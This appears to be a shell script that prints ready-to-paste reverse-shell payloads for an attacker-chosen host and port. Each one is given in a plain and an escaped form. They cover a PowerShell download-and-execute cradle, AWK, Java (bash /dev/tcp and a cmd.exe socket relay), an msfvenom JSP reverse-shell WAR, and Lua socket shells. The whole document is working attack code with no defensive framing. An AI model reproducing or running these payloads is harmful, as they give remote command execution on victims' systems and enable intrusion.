echo "powershell IEX (New-Object Net.WebClient).DownloadString('https://$host/minrev.ps1')"

printf "\nAWK\n"

echo "awk 'BEGIN {s = \"/inet/tcp/0/$host/$port\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"

printf "\n"

echo "awk 'BEGIN {s = \\\"/inet/tcp/0/$host/$port\\\"; while(42) { do{ printf \\\"shell>\\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \\\$0 |& s; close(c); } } while(c != \\\"exit\\\") close(s); }}' /dev/null"

printf "\nJAVA\n"

echo "r = Runtime.getRuntime()\\\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$host/$port;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[])\\\np.waitFor()"

printf "\n"


echo "r = Runtime.getRuntime()\\\\\np = r.exec([\\\"/bin/bash\\\",\\\"-c\\\",\\\"exec 5<>/dev/tcp/$host/$port;cat <&5 | while read line; do \\\\\\\$line 2>&5 >&5; done\\\"] as String[])\\\np.waitFor()"

echo "JAVA alt"

printf "String host=\"$host\";\nint port=$port;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"

printf "\n"

printf "String host=\\\"$host\\\";\nint port=$port;\nString cmd=\\\"cmd.exe\\\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"

printf "\n\nWAR\n"

printf "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$host LPORT=$port -f war > reverse.war \n strings reverse.war | grep jsp # in order to get the name of the file"

printf "\n\nLUA\n"

echo "LIN ONLY"

echo "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$host','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');\""

printf "\n"

echo "lua -e \\\"require('socket');require('os');t=socket.tcp();t:connect('$host','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');\\\""

echo "WIN AND LIN"

echo "lua5.1 -e 'local host, port = \"$host\", $port local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"

printf "\n"

echo "lua5.1 -e 'local host, port = \\\"$host\\\", $port local socket = require(\\\"socket\\\") local tcp = socket.tcp() local io = require(\\\"io\\\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \\\"r\\\") local s = f:read(\\\"*a\\\") f:close() tcp:send(s) if status == \\\"closed\\\" then break end end tcp:close()'"

